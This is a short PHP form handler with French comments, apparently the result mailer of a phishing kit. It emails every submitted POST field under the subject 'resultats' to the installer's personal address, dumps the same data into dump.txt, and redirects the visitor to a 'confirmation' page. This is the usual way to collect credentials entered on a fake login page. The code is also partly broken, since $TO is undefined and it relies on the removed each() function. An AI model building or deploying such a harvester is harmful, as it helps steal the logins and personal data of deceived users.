<?php
// j'explique clairement tonsite@tondomaine.com , vous mettez ta boite email de ton site ou le nom de domaine de ton site
//quand vous créez un site vous avez plusieurs boites email de votre site que vous allez crée facilement . 

$headers = 'MIME-Version: 1.0' . "\r\n"; //ne modifier que les 2 parties que j'ai ecrit ,laissez ces commentaires du code
 
$headers .= 'To: YOUR EMAIL HERE ' . "\r\n";//ici vous mettez votre adresse email gmail ou hotmail ...et suprimer mon email 

$headers .= 'From: your web site' . "\r\n";//ici vous mettez une boite email de ton site ou juste le nom de domaine de ton site

$headers .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
$headers .= 'Content-Transfer-Encoding: 8bit' . "\r\n";
$subject = "resultats";
$message = "";
while (list($key, $val) = each($_POST)) {if(!empty($val)) {$message .= "$key : $val\n";}}
mail($TO, $subject, $message, $headers);
 $fichier = fopen('dump.txt', 'r+' );
 file_put_contents('dump.txt' , print_r($_POST, true));
 fclose($fichier);

 
 header('location: confirmation'); //redirection vers une page ou un site
 
 ?>
